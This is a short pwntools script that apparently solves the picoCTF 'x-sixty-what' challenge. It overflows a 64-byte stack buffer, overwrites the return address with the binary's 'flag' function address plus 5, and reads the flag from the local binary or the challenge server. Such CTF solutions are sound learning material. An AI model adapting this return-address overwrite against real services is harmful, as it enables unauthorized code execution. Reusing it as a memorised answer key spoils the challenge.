#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './x-sixty-what.bin'

IP = 'saturn.picoctf.net'
PORT = 65498

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


p = open_instance()

# generate payload
padding = b'A' * (64 + 8)
flag_addr = elf.symbols['flag']
# +5 to skip the first push causing segfault
payload = padding + p64(flag_addr + 5)

# send payload
p.readuntil(b'Give me a string that gets you the flag: ')
p.sendline(payload)

# read flag
flag = p.recvall().strip()
print(flag.decode())
